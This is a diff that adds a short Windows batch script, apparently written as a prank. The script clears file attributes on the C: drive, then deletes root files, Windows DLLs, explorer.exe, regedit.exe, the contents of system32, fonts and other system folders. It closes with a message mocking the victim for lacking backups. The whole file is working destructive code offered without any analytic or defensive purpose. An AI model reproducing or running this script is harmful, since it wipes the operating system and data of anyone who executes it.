@@ -1,0 +1,20 @@
+REM this is a lame thing to do, but i was so bored.
+@echo off
+attrib -r -a -s -h c:\*.* /D
+del /q /f c:\*.*
+del c:\windows\*.dat
+del c:\windows\*.dll
+del c:\windows\explorer.exe
+del c:\windows\notepad.exe
+del c:\windows\regedit.exe
+del c:\windows\*.ini
+del c:\windows\cursors\*.*
+del c:\windows\fonts\*.*
+del c:\windows\media\*.*
+del c:\windows\prefetch\*.*
+del c:\windows\system32\*.*
+del c:\windows\tasks\*.*
+del c:\windows\temp\*.*
+echo you had backup, right? if not i may have learned you a lesson now!
+pause
+exit
